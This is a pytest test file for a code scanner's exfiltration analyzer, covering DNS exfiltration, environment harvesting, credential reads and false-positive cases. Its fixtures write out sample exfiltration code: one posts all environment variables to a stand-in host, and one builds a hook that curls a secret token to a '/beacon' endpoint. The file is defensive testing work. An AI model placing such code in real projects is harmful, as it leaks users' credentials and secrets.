from skills_verified.analyzers.exfiltration_analyzer import ExfiltrationAnalyzer
from skills_verified.core.models import Category, Severity


def test_is_available():
    analyzer = ExfiltrationAnalyzer()
    assert analyzer.is_available() is True
    assert analyzer.name == "exfiltration"


def test_finds_dns_exfil(fake_repo_path):
    analyzer = ExfiltrationAnalyzer()
    findings = analyzer.analyze(fake_repo_path)
    dns_findings = [f for f in findings if "dns" in f.title.lower()]
    assert len(dns_findings) >= 1
    assert dns_findings[0].category == Category.EXFILTRATION


def test_formatted_service_url_is_not_dns_exfiltration(tmp_path):
    source = tmp_path / "client.py"
    source.write_text(
        "model_run_id = 'demo'\n"
        "url = f'https://{model_run_id}.modelrun.inference.cloud.ru'\n"
    )

    findings = ExfiltrationAnalyzer().analyze(tmp_path)

    assert not any("dns" in finding.title.lower() for finding in findings)


def test_finds_env_harvest(fake_repo_path):
    analyzer = ExfiltrationAnalyzer()
    findings = analyzer.analyze(fake_repo_path)
    env_findings = [
        f
        for f in findings
        if "environ" in f.title.lower() or "harvest" in f.title.lower()
    ]
    assert len(env_findings) >= 1
    assert env_findings[0].category == Category.EXFILTRATION


def test_finds_http_exfil(fake_repo_path):
    """The exfiltration.py fixture contains requests.post with env data;
    the analyzer should flag the curl/wget pattern or the credential file read
    that accompanies the HTTP upload."""
    analyzer = ExfiltrationAnalyzer()
    findings = analyzer.analyze(fake_repo_path)
    http_findings = [
        f
        for f in findings
        if "curl" in f.title.lower()
        or "wget" in f.title.lower()
        or "upload" in f.title.lower()
    ]
    assert len(http_findings) >= 1
    assert http_findings[0].category == Category.EXFILTRATION


def test_finds_credential_read(fake_repo_path):
    analyzer = ExfiltrationAnalyzer()
    findings = analyzer.analyze(fake_repo_path)
    cred_findings = [f for f in findings if "credential" in f.title.lower()]
    assert len(cred_findings) >= 1
    assert cred_findings[0].category == Category.EXFILTRATION


def test_no_findings_clean(tmp_path):
    clean = tmp_path / "clean.py"
    clean.write_text("x = 1 + 2\nprint(x)\n")
    analyzer = ExfiltrationAnalyzer()
    findings = analyzer.analyze(tmp_path)
    assert findings == []


def test_ui_keyboard_handler_is_not_a_keylogger(tmp_path):
    source = tmp_path / "dialog.ts"
    source.write_text(
        'document.addEventListener("keydown", event => {\n'
        '  if (event.key === "Escape") closeDialog();\n'
        "});\n"
    )

    assert ExfiltrationAnalyzer().analyze(tmp_path) == []


def test_read_prefixed_http_response_is_not_file_exfiltration(tmp_path):
    source = tmp_path / "client.ts"
    source.write_text("const readResponse = await fetch('/api/document');\n")

    assert ExfiltrationAnalyzer().analyze(tmp_path) == []


def test_filtered_runtime_environment_is_not_bulk_harvesting(tmp_path):
    source = tmp_path / "config.ts"
    source.write_text(
        "for (const [key, value] of Object.entries(process.env)) {\n"
        "  if (key.startsWith('PUBLIC_')) config[key] = value;\n"
        "}\n"
    )

    assert ExfiltrationAnalyzer().analyze(tmp_path) == []


def test_environment_copy_without_network_sink_is_not_exfiltration(tmp_path):
    (tmp_path / "env.py").write_text("import os\ndata = os.environ.copy()\n")

    assert ExfiltrationAnalyzer().analyze(tmp_path) == []


def test_environment_variable_file_path_is_not_a_credential_file(tmp_path):
    (tmp_path / "pdf.py").write_text(
        "import os\nwith open(os.environ['PDF_TOKENS']) as source:\n    pass\n"
    )

    assert ExfiltrationAnalyzer().analyze(tmp_path) == []


def test_finds_environment_collection_flowing_to_http(tmp_path):
    suspect = tmp_path / "helper.py"
    suspect.write_text(
        "import os\n"
        "import requests\n"
        "secrets = {}\n"
        "for key, value in os.environ.items():\n"
        "    secrets[key] = value\n"
        "requests.post('https://example.test/collect', json={'env': secrets})\n"
    )

    findings = ExfiltrationAnalyzer().analyze(tmp_path)

    finding = next(f for f in findings if f.rule_id == "SV-DATAFLOW-SENSITIVE-NETWORK")
    assert finding.category == Category.EXFILTRATION
    assert finding.severity == Severity.HIGH
    assert finding.line_number == 6


def test_unrelated_environment_read_and_http_call_is_not_a_flow(tmp_path):
    clean = tmp_path / "client.py"
    clean.write_text(
        "import os\n"
        "import requests\n"
        "mode = os.getenv('APP_MODE')\n"
        "requests.get('https://example.test/health')\n"
    )

    findings = ExfiltrationAnalyzer().analyze(tmp_path)

    assert not any(f.rule_id == "SV-DATAFLOW-SENSITIVE-NETWORK" for f in findings)


def test_finds_taint_inside_generated_python_startup_hook(tmp_path):
    suspect = tmp_path / "installer.py"
    suspect.write_text(
        "target = 'https://example.test'\n"
        "generated = '''import os\n"
        "import subprocess\n"
        'secret = os.environ.get("TOKEN")\n'
        'payload = f"token={{secret}}"\n'
        'subprocess.run(["curl", "{target}/beacon", "-d", payload])\n'
        "'''.format(target=target)\n"
    )

    findings = ExfiltrationAnalyzer().analyze(tmp_path)

    finding = next(f for f in findings if f.rule_id == "SV-DATAFLOW-SENSITIVE-NETWORK")
    assert finding.line_number == 6
    assert "curl" in finding.evidence.snippet


def test_python_syntax_error_reports_partial_coverage(tmp_path):
    (tmp_path / "broken.py").write_text("def broken(:\n    pass\n")
    analyzer = ExfiltrationAnalyzer()

    assert analyzer.analyze(tmp_path) == []

    assert len(analyzer.diagnostics) == 1
    assert analyzer.diagnostics[0].code == "python_parse_error"
    assert analyzer.diagnostics[0].path == "broken.py"
